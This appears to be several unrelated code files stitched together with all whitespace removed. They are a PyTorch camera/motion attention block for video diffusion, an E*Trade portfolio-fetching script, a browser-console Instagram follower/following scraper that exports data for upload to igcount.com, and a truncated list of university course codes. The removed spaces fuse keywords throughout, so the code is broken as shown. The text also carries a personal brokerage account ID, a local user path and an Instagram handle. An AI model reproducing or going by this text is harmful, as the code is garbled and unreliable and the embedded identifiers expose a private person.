linear,disable_self_attn=disable_self_attn,)self.time_depth=time_depthself.depth=depthself.max_time_embed_period=max_time_embed_periodtime_mix_d_head=d_headn_time_mix_heads=n_headstime_mix_inner_dim=int(time_mix_d_head*n_time_mix_heads)inner_dim=n_heads*d_headifuse_spatial_context:time_context_dim=context_dimcamera_context_dim=time_context_dimmotion_context_dim=4#time_context_dim#Cameraattentionlayerself.time_mix_blocks=nn.ModuleList([BasicTransformerTimeMixBlock(inner_dim,n_time_mix_heads,time_mix_d_head,dropout=dropout,context_dim=camera_context_dim,timesteps=timesteps,checkpoint=checkpoint,ff_in=ff_in,inner_dim=time_mix_inner_dim,attn_mode=attn_mode,disable_self_attn=disable_self_attn,disable_temporal_crossattention=disable_temporal_crossattention,)for_inrange(self.depth)])#Motionattentionlayerself.motion_blocks=nn.ModuleList([BasicTransformerTimeMixBlock(inner_dim,n_time_mix_heads,time_mix_d_head,dropout=dropout,context_dim=motion_context_dim,timesteps=timesteps,checkpoint=checkpoint,ff_in=ff_in,inner_dim=time_mix_inner_dim,attn_mode=attn_mode,disable_self_attn=disable_self_attn,disable_temporal_crossattention=disable_temporal_crossattention,)for_inrange(self.depth)])assertlen(self.time_mix_blocks)==len(self.transformer_blocks)self.use_spatial_context=use_spatial_contextself.in_channels=in_channelstime_embed_dim=self.in_channels*4#Cameraviewembeddingself.time_mix_time_embed=nn.Sequential(linear(self.in_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,self.in_channels),)#Motiontimeembeddingself.time_mix_motion_embed=nn.Sequential(linear(self.in_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,self.in_channels),)self.time_mix_legacy=time_mix_legacyifself.time_mix_legacy:ifmerge_strategy=="fixed":self.register_buffer("mix_factor",torch.Tensor([merge_factor]))elifmerge_strategy=="learned"ormerge_strategy=="learned_with_images":self.register_parameter("mix_factor",torch.nn.Parameter(torch.Tensor([merge_factor])))elifmerge_strategy=="fixed_with_images":self.mix_factor=Noneelse:raiseValueError(f"unknownmergestrategy{merge_strategy}")self.get_alpha_fn=partial(get_alpha,merge_strategy,self.mix_factor,apply_sigmoid=apply_sigmoid_to_merge,is_attn=True,)else:self.time_mixer=AlphaBlender(alpha=merge_factor,merge_strategy=merge_strategy)defforward(self,x:torch.Tensor,context:Optional[torch.Tensor]=None,#cam:Optional[torch.Tensor]=None,time_context:Optional[torch.Tensor]=None,timesteps:Optional[int]=None,image_only_indicator:Optional[torch.Tensor]=None,cond_view:Optional[torch.Tensor]=None,cond_motion:Optional[torch.Tensor]=None,time_step:Optional[int]=None,name:Optional[str]=None,)->torch.Tensor:_,_,h,w=x.shapex_in=xspatial_context=Noneifexists(context):spatial_context=context#cond_view:bv4hw#cond_motion:bt4hwb,t,d1=context.shape#CLIPv,d2=cond_view.shape[0]//b,cond_view.shape[1]#VAEcond_view=torch.nn.functional.interpolate(cond_view,size=(h,w),mode="bilinear")#b*vdhwspatial_context=context[:,:,None].repeat(1,1,v,1).reshape(-1,1,d1)#(b*t*v)1d1camera_context=context[:,:,None].repeat(1,1,h*w,1).reshape(-1,1,d1)#(b*t*h*w)1d1motion_context=cond_view.permute(0,2,3,1).reshape(-1,1,d2)#(b*v*h*w)1d2x=self.norm(x)ifnotself.use_linear:x=self.proj_in(x)x=rearrange(x,"bchw->b(hw)c")#21x4096x320ifself.use_linear:x=self.proj_in(x)c=x.shape[-1]ifself.time_mix_legacy:alpha=self.get_alpha_fn(image_only_indicator=image_only_indicator)num_frames=torch.arange(t,device=x.device)num_frames=repeat(num_frames,"t->bt",b=b)num_frames=rearrange(num_frames,"bt->(bt)")t_emb=timestep_embedding(num_frames,self.in_channels,repeat_only=False,max_period=self.max_time_embed_period,)emb_time=self.time_mix_motion_embed(t_emb)emb_time=emb_time[:,None,:]#b*tx1x320num_views=torch.arange(v,device=x.device)num_views=repeat(num_views,"t->bt",b=b)num_views=rearrange(num_views,"bt->(bt)")v_emb=timestep_embedding(num_views,self.in_channels,repeat_only=False,max_period=self.max_time_embed_period,)emb_view=self.time_mix_time_embed(v_emb)emb_view=emb_view[:,None,:]#b*vx1x320forit_,(block,time_block,mot_block)inenumerate(zip(self.transformer_blocks,self.time_mix_blocks,self.motion_blocks)):#Spatialattentionx=block(x,context=spatial_context,)#Cameraattentionx=x.view(b,t,v,h*w,c).permute(0,2,1,3,4).reshape(b*v,-1,c)#b*vt*h*wcx_mix=x+emb_viewx_mix=time_block(x_mix,context=camera_context,timesteps=v)ifself.time_mix_legacy:x=alpha.to(x.dtype)*x+(1.0-alpha).to(x.dtype)*x_mixelse:x=self.time_mixer(x_spatial=x,x_temporal=x_mix,image_only_indicator=image_only_indicator[:,:v],)#Motionattentionx=x.view(b,v,t,h*w,c).permute(0,2,1,3,4).reshape(b*t,-1,c)#b*tv*h*wcx_mix=x+emb_timex_mix=mot_block(x_mix,context=motion_context,timesteps=t)ifself.time_mix_legacy:x=alpha.to(x.dtype)*x+(1.0-alpha).to(x.dtype)*x_mixelse:x=self.time_mixer(x_spatial=x,x_temporal=x_mix,image_only_indicator=image_only_indicator[:,:t],)x=x.view(b,t,v,h*w,c).reshape(-1,h*w,c)#b*t*vh*wcifself.use_linear:x=self.proj_out(x)x=rearrange(x,"b(hw)c->bchw",h=h,w=w)ifnotself.use_linear:x=self.proj_out(x)out=x+x_inreturnoutimportpandasaspdfromrauthimportOAuth1Serviceimportwebbrowserimportjsonimportconfigparserconfig=configparser.ConfigParser()config.read(r'C:\Users\natha\Programming\PortfolioManager\config.ini')fromaccounts.accountsimportAccountsbase='https://api.etrade.com'etrade=OAuth1Service(name='etrade',consumer_key=config['DEFAULT']['CONSUMER_KEY'],consumer_secret=config['DEFAULT']['CONSUMER_SECRET'],request_token_url='https://api.etrade.com/oauth/request_token',access_token_url='https://api.etrade.com/oauth/access_token',authorize_url='https://us.etrade.com/e/t/etws/authorize?key={}&token={}',base_url='https://api.etrade.com')request_token,request_token_secret=etrade.get_request_token(params={'oauth_callback':'oob','format':'json'})authorize_url=etrade.authorize_url.format(etrade.consumer_key,request_token)webbrowser.open(authorize_url)text_code=input("Pleaseacceptagreementandenterverificationcodefrombrowser:")session=etrade.get_auth_session(request_token,request_token_secret,params={"oauth_verifier":text_code})accounts=session.get(base+'/v1/accounts/list.json',header_auth=True).json()['AccountListResponse']['Accounts']['Account']account=[accountforaccountinaccountsifaccount['accountId']=='725440456'][0]accountIdKey=account['accountIdKey']url=base+'/v1/accounts/'+accountIdKey+'/portfolio.json'portfolio=session.get(url,header_auth=True).json()['PortfolioResponse']['AccountPortfolio'][0]['Position']df=pd.DataFrame(portfolio).sort_values(by=['marketValue'],ascending=False)df.to_pickle('portfolio.pkl')asyncfunctiongetUser(username){constheaders=newHeaders({authority:'www.instagram.com',accept:'*/*','accept-language':'en-GB,en;q=0.5','sec-ch-ua':'"Brave";v="119","Chromium";v="119","Not?A_Brand";v="24"','sec-ch-ua-mobile':'?0','sec-ch-ua-model':'""','sec-ch-ua-platform':'macOS','sec-ch-ua-platform-version':'14.0.0','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','sec-gpc':'1','user-agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/119.0.0.0Safari/537.36','x-ig-app-id':'936619743392459','x-requested-with':'XMLHttpRequest',});consturl=newURL('https://www.instagram.com/api/v1/feed/user/'+username+'/username/');url.searchParams.append('count','12');try{constresponse=awaitfetch(url,{method:'GET',headers:headers,});if(!response.ok){thrownewError('HTTPerror!Status:'+response.status);}constdata=awaitresponse.json();returndata.user.pk;//Processthedataasneeded}catch(error){console.error('Fetcherror:',error);}//wait0.2to1sec}asyncfunctiongetFollowings(userId){constresponses=[];constheaders=newHeaders({authority:'www.instagram.com',accept:'*/*','accept-language':'en-GB,en;q=0.5','sec-ch-ua':'"Brave";v="119","Chromium";v="119","Not?A_Brand";v="24"','sec-ch-ua-mobile':'?0','sec-ch-ua-model':'""','sec-ch-ua-platform':'macOS','sec-ch-ua-platform-version':'14.0.0','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','sec-gpc':'1','user-agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/119.0.0.0Safari/537.36','x-ig-app-id':'936619743392459','x-requested-with':'XMLHttpRequest',});letmax_id=undefined;do{consturl=newURL('https://www.instagram.com/api/v1/friendships/'+userId+'/following/');url.searchParams.append('count','200');if(max_id){url.searchParams.append('max_id',String(max_id));}try{constresponse=awaitfetch(url,{method:'GET',headers:headers,});if(!response.ok){thrownewError('HTTPerror!Status:'+response.status);}constdata=awaitresponse.json();//Processthedataasneededresponses.push(data);max_id=data.next_max_id;}catch(error){console.error('Fetcherror:',error);}//wait0.2to1secawaitnewPromise((r)=>setTimeout(r,Math.random()*800+200));}while(max_id);constusers=responses.map((r)=>r.users).flat();returnusers;}asyncfunctiongetFollowers(userId){constresponses=[];constheaders=newHeaders({authority:'www.instagram.com',accept:'*/*','accept-language':'en-GB,en;q=0.5','sec-ch-ua':'"Brave";v="119","Chromium";v="119","Not?A_Brand";v="24"','sec-ch-ua-mobile':'?0','sec-ch-ua-model':'""','sec-ch-ua-platform':'macOS','sec-ch-ua-platform-version':'14.0.0','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','sec-gpc':'1','user-agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/119.0.0.0Safari/537.36','x-ig-app-id':'936619743392459','x-requested-with':'XMLHttpRequest',});letmax_id=undefined;do{consturl=newURL('https://www.instagram.com/api/v1/friendships/'+userId+'/followers/');url.searchParams.append('count','200');if(max_id){url.searchParams.append('max_id',String(max_id));}try{constresponse=awaitfetch(url,{method:'GET',headers:headers,});if(!response.ok){thrownewError('HTTPerror!Status:'+response.status);}constdata=awaitresponse.json();//Processthedataasneededresponses.push(data);max_id=data.next_max_id;}catch(error){console.error('Fetcherror:',error);}//wait0.2to1secawaitnewPromise((r)=>setTimeout(r,Math.random()*800+200));}while(max_id);constusers=responses.map((r)=>r.users).flat();returnusers;}letscript=async(userId)=>{const[followings,followers]=awaitPromise.all([getFollowings(userId),getFollowers(userId)]);console.log('Found'+followings.length+'followings,and'+followers.length+'followers');constpayloadData={id:'clz0mf5kt000317667402v1e4',followers:followers.map((u)=>({username:u.username,fullName:u.full_name,profilePicUrl:u.profile_pic_url,profilePicId:u.profile_pic_id,})),followings:followings.map((u)=>({username:u.username,fullName:u.full_name,profilePicUrl:u.profile_pic_url,profilePicId:u.profile_pic_id,})),};functiondownloadTxt(data,filename){consttextBlob=newBlob([data],{type:'text/plain;charset=utf-8'});constdownloadLink=document.createElement('a');downloadLink.href=URL.createObjectURL(textBlob);downloadLink.download=filename;document.body.appendChild(downloadLink);downloadLink.click();document.body.removeChild(downloadLink);URL.revokeObjectURL(textBlob);}constpayloadString=JSON.stringify(payloadData);//functionb64EncodeUnicode(str){//returnbtoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,function(match,p1){//returnString.fromCharCode(parseInt(p1,16))//}))//}//constencodedString=b64EncodeUnicode(payloadString);constencodedString=payloadString;console.log('%cDownloadthefileanduploaditto%cigcount.com','color:black;font-weight:bold;background-color:#f0f8ff;padding:2px;','color:white;font-weight:bold;background-color:rgb(181,77,255);padding:6px;');downloadTxt(encodedString,'igcount-upload-clz0mf5kt000317667402v1e4.txt');};asyncfunctiongetId(){consturl=newURL('https://www.instagram.com/ajax/navigation/');constresponse=awaitfetch(url,{method:'GET',});constdata=awaitresponse.json();}console.log('%cigcount','color:white;background:rgb(181,77,255);font-weight:bold;font-size:24px;padding:1rem');console.log('%cCollectingyourfollowersandfollowings...','color:black;font-weight:bold;background-color:#f0f8ff;padding:2px;');console.log('%cThismaytakeawhileifyouhavemanyfollowers/followings','color:black;font-weight:bold;background-color:#f0f8ff;padding:2px;');getUser('nathan__dai').then((userId)=>{returnscript(userId);});constsubjects=['MUSIC','NUCENG','ENGIN','GWS','POLSCI','UGBA','MECENG','SLAVIC','MUSIC','INTEGBI','GEOG','MATH','INTEGBI','MBA','AFRICAM','PHILOS','ARCH','EWMBA','LINGUIS','BIOENG','ENGIN','EPS','ESPM','FRENCH','NEU','SLAVIC','JAPAN','COMLIT','HISTORY','EDUC','LDARCH','XMBA','RELIGST','MECENG','POLSCI','ARABIC','URDU','KOREAN','ENVECON','PBHLTH','AFRICAM','ENGLISH','HISTORY','LINGUIS','SOCWEL','LEGALST','LDARCH','INTEGBI','UGIS','MUSIC','MEDIAST','POLSCI','THEATER','ASTRON','DESINV','HISTORY','ESPM','BIOENG','HISTART','HISTORY','SOCIOL','PSYCH','ITALIAN','GEOG','PBHLTH','PHILOS','HISTART','PUBPOL','LDARCH','ESPM','MBA','ENGIN','CHEM','THEATER','CELTIC','ANTHRO','FILM','LS','DESINV','ASTRON','CHEM','COGSCI','PHDBA','ESPM','EWMBA','MCELLBI','ESPM','EWMBA','ESPM','ISF','COLWRIT','HISTORY','EPS','XMUSIC','MECENG','ITALIAN','GWS','EWMBA','PACS','ART','OPTOM','GERMAN','INTEGBI','ENGIN','CDSS','DATA','THEATER','BUDDSTD','ENGLISH','COLWRIT','XMBA','INDENG','JOURN','EDUC','BIOENG','INDENG','PLANTBI','HUM','CIVENG','AFRICAM','MATSCI','BIOENG','INDENG','MECENG','ARCH','CHMENG','DESINV','GERMAN','EPS','NUSCTX','SOCWEL','ARCH','CHINESE','SPANISH','SASIAN','PBHLTH','UGBA','GWS','MATH','GERMAN','HISTORY','ENGIN','PHDBA','CELTIC','STAT','GERMAN','MCELLBI','LS','PBHLTH','MECENG','FRENCH','VISSTD','FRENCH','EPS','SSEASN','GWS','ESPM','MCELLBI','HISTORY','NATAMST','ARCH','JAPAN','CHEM','MFE','CPH','PHDBA','MUSIC','SOCIOL','STAT','MATH','STAT','JOURN','LDARCH','POLECON','ANTHRO','TURKISH','EPS','NUSCTX','SSEASN','POLSCI','SOCIOL','UGBA','ENGIN','AFRICAM','ASAMST','EWMBA','HEBREW','ECON','ASAMST','ITALIAN','COMPSS','ARCH','RHETOR','ARABIC','PBHLTH','SSEASN','COLWRIT','LDARCH','EDUC','EWMBA','PACS','SOCIOL','LINGUIS','HISTORY','COLWRIT','LINGUIS','ANTHRO','CHMENG','ENVDES','FILM','AFRICAM','EDUC','HISTORY','RDEV','DATA','ANTHRO','CIVENG','MUSIC','PSYCH','AGRS','ELENG','BIOENG','MECENG','MCELLBI','PBHLTH','DEMOG','MFE','MUSIC','CYPLAN','HISTORY','JOURN','SOCWEL','UGIS','HISTART','INTEGBI','MECENG','PHILOS','NWMEDIA','POLSCI','AFRICAM','DATASCI','ASTRON','CYBER','JEWISH','ANTHRO','CYPLAN','JOURN','OPTOM','JAPAN','HEBREW','SLAVIC','SOCWEL','ARCH','BIOENG','MECENG','GERMAN','MCELLBI','PBHLTH','MELC','MCELLBI','MATH','CHICANO','LINGUIS','COMLIT','POLSCI','ARCH','ITALIAN','MBA','TIBETAN','UGBA','KOREAN','MCELLBI','ANTHRO','ENGLISH','SOCIOL','ANTHRO','LEGALST','ARCH','MATH','ARABIC','CHICANO','ENGLISH','JEWISH','MBA','PBHLTH','PBHLTH','ENERES','ENGLISH','EWMBA','HISTART','RHETOR','SOCIOL','EDUC','THEATER','GEOG','PHYSED','MATH','EDUC','MECENG','OPTOM','PSYCH','PUBPOL','SCANDIN','MECENG','SOCIOL','CHEM','CYPLAN','AGRS','LEGALST','MATH','PHYSICS','SPANISH','LINGUIS','PLANTBI','ELENG','GLOBAL','ESPM','SOCWEL','INDENG','RUSSIAN','AFRICAM','GERMAN','PHYSICS','SOCWEL','GEOG','MELC','CIVENG','SPANISH','LS','GEOG','ESPM','PSYCH','ENVECON','THEATER','UGIS','AFRICAM','PHYSICS','DESINV','LEGALST','MELC','ANTHRO','LINGUIS','STAT','PSYCH','XAFRICA','PBHLTH','CHINESE','MECENG','GEOG','JOURN','MFE','POLSCI','ENVDES','CHMENG','MBA','ELENG','RHETOR','MCELLBI','COMLIT','BIOENG','ANTHRO','SCANDIN','AGRS','JOURN','ECON','AFRICAM','BIOENG','LDARCH','PHYSICS','MELC','PBHLTH','GREEK','ARABIC','JAPAN','COLWRIT','GERMAN','FRENCH','ENGIN','CYPLAN','LDARCH','ARCH','ANTHRO','COGSCI','COGSCI','LINGUIS','FRENCH','MBA','NUSCTX','DESINV','PSYCH','CHEM','NORWEGN','PSYCH','HISTORY','POLSCI','KOREAN','EPS','OPTOM','XAMRSTD','HISTORY','XMBA','MELC','COLWRIT','ENVDES','ENVDES','PHYSED','PHDBA','PHYSICS','CHICANO','CHMENG','PBHLTH','POLSCI','XHISTAR','MECENG','ITALIAN','FRENCH','COLWRIT','SEMITIC','COMLIT','CHINESE','DEVP','CHEM','ITALIAN','MBA','BIOENG','CLASSIC','CHINESE','ENVDES','POLSCI','ARCH','ANTHRO','LATIN','GERMAN','MECENG','PSYCH','THEATER','HISTORY','ENGLISH','MATH','CHEM','MECENG','ENGIN','NEU','INTEGBI','SOCIOL','SOCWEL','CIVENG','COMLIT','HUM','ARCH','ENERES','AGRS','MATSCI','BIOENG','CHMENG','PBHLTH','CHINESE','STAT','XPHILOS','PHILOS','CUNEIF','MCELLBI','SLAVIC','JAPAN','FILM','LGBT','ANTHRO','GERMAN','LS','POLSCI','EDUC','NATAMST','NUSCTX','HISTART','MCELLBI','LINGUIS','ART','ENGIN','GEOG','HISTORY','LINGUIS','MATH','OPTOM','EDUC','ENGLISH','HISTORY','MUSIC','MUSIC','PSYCH','AFRICAM','ECON','ENGLISH','COLWRIT','MEDIAST','GEOG','OPTOM','POLSCI','ARESEC','SLAVIC','SPANISH','SLAVIC','MCELLBI','EWMBA','LEGALST','ECON','ENGIN','LINGUIS','SOCIOL','ESPM','NUSCTX','SPANISH','ARCH','NATAMST','LDARCH','HISTORY','HISTART','ICELAND','LDARCH','SSEASN','PHYSICS','POLSCI','CLASSIC','ECON','EWMBA','PHYSICS','MONGOLN','AGRS','ANTHRO','ESPM','ANTHRO','ECON','HISTART','HEBREW','XMBA','ESPM','HISTART','NATAMST','ARMENI','VISSCI','ARCH','MECENG','MCELLBI','CRITTH','INDENG','MESTU','MBA','COLWRIT','EDUC','ENGLISH','VISSTD','EDUC','EDUC','EDUC','LS','HISTORY','NUCENG','ENGIN','MUSIC','RHETOR','SSEASN','ISF','EECS','ENERES','MBA','NUSCTX','ELENG','LINGUIS','OPTOM','MCELLBI','CHEM','HISTORY','PLANTBI','SASIAN','THEATER','GEOG','ENERES','XANTHRO','MATH','BIOENG','MECENG','ANTHRO','CYPLAN','EALANG','POLSCI','EDUC','SASIAN','PBHLTH','XMBA','CHINESE','EWMBA','XPOLSCI','POLSCI','FILM','ANTHRO','GEOG','AFRICAM','NUSCTX','MCELLBI','MUSIC','ARABIC','SOCWEL','EDUC','CIVENG','PHYSICS','ANTHRO','MCELLBI','CRWRIT','GERMAN','HEBREW','MUSIC','STAT','MEDIAST','HISTART','MELC','POLECON','MECENG','RELIGST','THEATER','THEATER','EDUC','MUSIC','PBHLTH','LINGUIS','ANTHRO','MATH','EGYPT','MECENG','MEDIAST','MCELLBI','CIVENG','PBHLTH','MPS','EWMBA','HISTART','MCELLBI','PSYCH','EWMBA','SANSKR','LDARCH','ETHSTD','ENVECON','LINGUIS','CHINESE','MATH','MELC','DEMOG','CHEM','JAPAN','ARCH','ECON','COLWRIT','CHINESE','ENGIN','FRENCH','EALANG','HISTART','HISTORY','COLWRIT','PHDBA','INTEGBI','MATH','NUCENG','EDUC','ECON','ASAMST','CHEM','ARCH','ENVDES','INTEGBI','PACS','ENGIN','RHETOR','AEROSPC','HEBREW','DUTCH','AFRICAM','XGEOG','CIVENG','HISTART','ESPM','OPTOM','PHDBA','RHETOR','LEGALST','THEATER','EDUC','INDENG','MATH','PSYCH','SOCWEL','TURKISH','EDSTEM','INDONES','EWMBA','INTEGBI','UGIS','COMPSCI','XMBA','UGIS','INDENG','SOCIOL','ENGLISH','PBHLTH','BIOENG','PSYCH','INTEGBI','NATAMST','FRENCH','MATH','MUSIC','MEDIAST','ANTHRO','CLASSIC','HISTORY','ILA','ENGLISH','INTEGBI','JOURN','UGIS','VIETNMS','HISTORY','CYPLAN','ENGIN','XMBA','ITALIAN','SOCIOL','HISTART','NWMEDIA','EWMBA','MCELLBI','ANTHRO','MBA','MELC','PLANTBI','PSYCH','ETHSTD','COMPSCI','PSYCH','XMBA','THEATER','HISTORY','JAPAN','FRENCH','POLSCI','NUSCTX','ELENG','LGBT','UGIS','COLWRIT','BIOENG','ETHSTD','GSPDP','EDUC','COLWRIT','ISF','ENGLISH','EDUC','ESPM','SOCIOL','SOCIOL','ETHSTD','UGBA','EWMBA','FRENCH','AGRS','POLSCI','SSEASN','PBHLTH','JOURN','POLECON','ESPM','ANTHRO','INTEGBI','UGBA','PBHLTH','MELC','SLAVIC','COMPSS','MCELLBI','SLAVIC','LINGUIS','ENGLISH','RHETOR','UGBA','ECON','MEDIAST','ENGLISH','JOURN','MBA','PHDBA','PHILOS','ENGIN','IRANIAN','CYPLAN','LATAMST','HISTART','MCELLBI','ANTHRO','THEATER','ESPM','ENGLISH','ENGLISH','OPTOM','CLASSIC','GEOG','PBHLTH','ESPM','HEBREW','LEGALST','PSYCH','RHETOR','HISTORY','MUSIC','AFRICAM','LDARCH','SOCIOL','SOCIOL','JOURN','ITALIAN','AMERSTD','CIVENG','ENGLISH','INTEGBI','EECS','PBHLTH','GEOG','ARCH','MATH','MELC','VIETNMS','SLAVIC','CHMENG','FRENCH','SOCIOL','EDUCSPE','POLSCI','ENGIN','ESPM','PSYCH','CIVENG','ASAMST','COLWRIT','EGYPT','FILIPN','COLWRIT','MATH','PHILOS','POLSCI','POLSCI','ENGLISH','FILIPN','PSYCH','MELC','THEATER','AMERSTD','PBHLTH','FILM','GEOG','EPS','GLOBAL','MATSCI','EDUC','EECS','EDUC','SOCWEL','LINGUIS','CHEM','PBHLTH','POLSCI','MECENG','AGRS','GEOG','ARMENI','EDUC','MBA','ENVDES','SOCIOL','ARCH','ELENG','PHDBA','ENGIN','PUBPOL','ESPM','MBA','LINGUIS','INTEGBI','LINGUIS','THEATER','ASAMST','CHMENG','ASAMST','FILM','EDSTEM','ENGIN','MATH','PHDBA','ELENG','JOURN','UGBA','XMATH','MUSIC','INTEGBI','ANTHRO','LS','MECENG','ECON','SSEASN','LEGALST','INTEGBI','GLOBAL','MEDST','FILM','GEOG','ANTHRO','ENERES','CUNEIF','BOSCRSR','MELC','MBA','ANTHRO','MBA','RHETOR','CHMENG','CHINESE','GEOG','EALANG','EDUC','MATSCI','ENGLISH','MELC','CHINESE','HISTORY','ARCH','CIVENG','ANTHRO','EALANG','TURKISH','MFE','AFRICAM','JOURN','CHINESE','COLWRIT','AFRICAM','NUCENG','HISTART','POLECON','POLSCI','PLANTBI','CIVENG','KOREAN','COMLIT','MBA','OPTOM','EPS','CLASSIC','JAPAN','CMPBIO','BIOENG','HISTORY','POLECON','LINGUIS','NUCENG','SOCWEL','SLAVIC','PACS','CHMENG','JEWISH','CHINESE','HISTART','SOCWEL','UGBA','HISTORY','MBA','PSYCH','XRHETOR','ARESEC','ARCH','DATASCI','CHEM','EWMBA','HISTORY','SOCWEL','EDUC','ARESEC','PUBPOL','MBA','MCELLBI','ENGIN','BUDDSTD','ESPM','SCANDIN','ELENG','STAT','ARCH','HISTORY','ETHSTD','GERMAN','HINDI','LATIN','JOURN','POLSCI','POLSCI','SOCIOL','JOURN','SLAVIC','HISTART','SOCIOL','GWS','CYPLAN','RHETOR','GWS','SOCIOL','RHETOR','MCELLBI','GEOG','ARCH','SSEASN','EDUC','NATAMST','ENVECON','PUBPOL','JAPAN','MBA','CIVENG','IRANIAN','EGYPT','MONGOLN','XHISTAR','UGIS','PERSIAN','POLSCI','HISTORY','GERMAN','AEROSPC','EDUC','COMPSS','NATAMST','KOREAN','HISTORY','ASAMST','ECON','SASIAN','MCELLBI','LS','ELENG','LINGUIS','GWS','UGBA','RHETOR','ARCH','HISTORY','MUSIC','ESPM','EDUC','EDUC','EDUC','PBHLTH','AFRICAM','MBA','MATH','INDONES','STAT','AMERSTD','FILM','HISTORY','ASTRON','CIVENG','COMPSCI','POLSCI','UGBA','THEATER','COLWRIT','CHMENG','ELENG','ANTHRO','COMPSCI','RUSSIAN','ESPM','ITALIAN','EPS','ANTHRO','MBA','ANTHRO','ISF','AFRICAM','PHILOS','FILM','POLSCI','ASAMST','UGBA','ANTHRO','SOCWEL','COLWRIT','MBA','AMERSTD','LINGUIS','AGRS','HISTORY','POLSCI','STAT','PBHLTH','LEGALST','ENGLISH','SLAVIC','MECENG','CHINESE','LEGALST','ANTHRO','PBHLTH','BIOENG','ESPM','POLSCI','ARCH','EDUC','LATIN','COLWRIT','FILM','GEOG','HISTORY','LINGUIS','ECON','PHDBA','POLSCI','MATH','HMEDSCI','ESPM','PSYCH','PSYCH','SOCIOL','SLAVIC','SOCWEL','OPTOM','POLSCI','GPP','ARCH','INDENG','EDUC','DIGHUM','CYPLAN','EDUC','ENGLISH','GWS','MECENG','INTEGBI','SOCWEL','NEU','HISTART','CIVENG','CLASSIC','XMATH','CHINESE','NUSCTX','FRENCH','ASAMST','MUSIC','SPANISH','PBHLTH','MECENG','POLSCI','IAS','MELC','AMERSTD','ECON','INTEGBI','NWMEDIA','GERMAN','FRENCH','PBHLTH','PSYCH','HISTART','PUBPOL','LEGALST','PHYSICS','GERMAN','EDUC','ENGLISH','PSYCH','SEMITIC','NUCENG','MCELLBI','MCELLBI','COLWRIT','PSYCH','HISTORY','PERSIAN','MCELLBI','GERMAN','ARCH','ITALIAN','MBA','PHYSED','EALANG','PHYSICS','INDENG','ARCH','ESPM','KOREAN','ASAMST','DESINV','MBA','ANTHRO','PHYSICS','POLSCI','DEVP','RHETOR','DUTCH','MBA','THEATER','SOCWEL','EDUC','CIVENG','LEGALST','CHEM','BIOENG','INDENG','MECENG','ENGLISH','MBA','MCELLBI','RUSSIAN','INDENG','NUCENG','ENGIN','COMLIT','NUSCTX','ARCH','ECON','NATAMST','CHINESE','MUSIC','TURKISH','XASAMST','GWS','ENGIN','RHETOR','ESPM','COLWRIT','EPS','ARCH','ECON','GREEK','ITALIAN','MCELLBI','PHILOS','UGIS','INTEGBI','POLSCI','NUSCTX','OPTOM','HISTART','GERMAN','INDENG','MESTU','XMBA','AGRS','ENGLISH','EWMBA','EDUC','CHEM','ART','MCELLBI','CELTIC','COLWRIT','INTEGBI','OPTOM','INTEGBI','SLAVIC','JOURN','MELC','LDARCH','POLSCI','INTEGBI','PHILOS','ARCH','CIVENG','HISTART','LS','PUBPOL','HISTORY','RHETOR','HISTART','LINGUIS','ARCH','COLWRIT','PBHLTH','PBHLTH','NEU','MELC','ANTHRO','ESPM','LEGALST','UGBA','ESPM','HEBREW','ANTHRO','CIVENG','ENGLISH','ASTRON','ANTHRO','MUSIC','POLSCI','EDUC','ENGLISH','NATRES','EDUC','LINGUIS','MCELLBI','EDUC','SASIAN','COMLIT','ANTHRO','NAVSCI','UGBA','SOCWEL','EDUC','JOURN','MELC','HINDI','PBHLTH','ESPM','INFO','PHYSICS','SLAVIC','IAS','NUCENG','LINGUIS','POLSCI','AGRS','ECON','KOREAN','LEGALST','ESPM','THEATER','LINGUIS','NEU','PHDBA','MCELLBI','MBA','MCELLBI','CHEM','GSPDP','EDUC','FRENCH','ANTHRO','LS','LDARCH','BIOPHY','LINGUIS','MECENG','ENGIN','MELC','COGSCI','OPTOM','MCELLBI','MUSIC','ENVDES','PBHLTH','ECON','POLSCI','PUBPOL','AMERSTD','CHEM','SOCIOL','LDARCH','CHEM','EDUC','MFE','PORTUG','HISTART','RHETOR','SPANISH','MBA','MUSIC','EDUC','LINGUIS','MELC','PBHLTH','PUBPOL','ENVDES','EWMBA','GWS','ARMENI','EDUC','CZECH','MUSIC','EDUC','OPTOM','HISTORY','CIVENG','FILM','EGYPT','ESPM','ITALIAN','ESPM','PERSIAN','STAT','CUNEIF','MCELLBI','PBHLTH','PUBAFF','AEROENG','MCELLBI','GEOG','SPANISH','ARCH','CIVENG','EDUC','CHICANO','ENERES','MUSIC','THEATER','UGBA','ESPM','PBHLTH','SSEASN','PSYCH','HISTART','GEOG','MBA','STAT','SSEASN','NWMEDIA','ENGLISH','UGBA','SSEASN','CHICANO','DIGHUM','JAPAN','CYPLAN','ENGIN','ENVECON','XMBA','MECENG','CHICANO','MATH','HISTORY','POLSCI','TURKISH','COMPSS','MECENG','EWMBA','SOCIOL','KOREAN','ECON','ELENG','FILM','NUSCTX','COLWRIT','ESPM','MECENG','MUSIC','POLSCI','POLSCI','HISTART','GERMAN','POLSCI','ENERES','COGSCI','POLSCI','GERMAN','ECON','FRENCH','SASIAN','LINGUIS','HISTORY','PUBPOL','INFO','POLSCI','SPANISH','AEROSPC','ARCH','MBA','POLECON','KOREAN','CHINESE','SLAVIC','MEDIAST','UGIS','HISTART','FRENCH','EDSTEM','NUCENG','SOCIOL','ANTHRO','PSYCH','MCELLBI','CMPBIO','LINGUIS','GEOG','MBA','ENGIN','ELENG','SASIAN','MFE','HISTORY','COLWRIT','LINGUIS','ENGLISH','CIVENG','NUCENG','UGBA','ELENG','ARCH','HISTART','MATH','GMS','FILM','CIVENG','HISTART','EDUC','OPTOM','NEU','OPTOM','CYPLAN','CZECH','DEVENG','GERMAN','GWS','HISTORY','INTEGBI','MECENG','ENGLISH','ASTRON','ANTHRO','HISTART','EDUC','ECON','ISF','NUCENG','ARCH','ART','HISTART','PHI